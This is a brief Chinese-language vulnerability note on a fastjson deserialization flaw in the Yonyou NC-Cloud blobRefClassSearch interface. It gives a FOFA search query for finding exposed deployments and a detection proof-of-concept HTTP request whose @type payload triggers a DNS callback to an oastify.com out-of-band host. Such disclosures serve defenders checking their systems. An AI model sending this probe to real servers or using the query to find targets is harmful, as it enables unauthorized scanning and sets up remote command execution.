**fofa**

app="用友-NC-Cloud"

**一、漏洞简述**

用友NC以“全球化集团管控、行业化解决方案、全程化电子商务、平台化应用集成”的管理业务理念而设计，采用J2EE架构和先进开放的集团级开发平台UAP，形成了集团管控8大领域15大行业68个细分行业的解决方案，是中国大企业集团管理信息化应用系统的首选。其接口blobRefClassSearch存在fastjson反序列化漏洞，攻击者可通过该漏洞执行任意命令控制服务器。

**二、漏洞检测poc**

```yaml
POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/json
Content-Length: 146

{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"111111.j3nmzhym834g0t5n9dv5kupkrbx2ls9h.oastify.com\"}}}"}
```

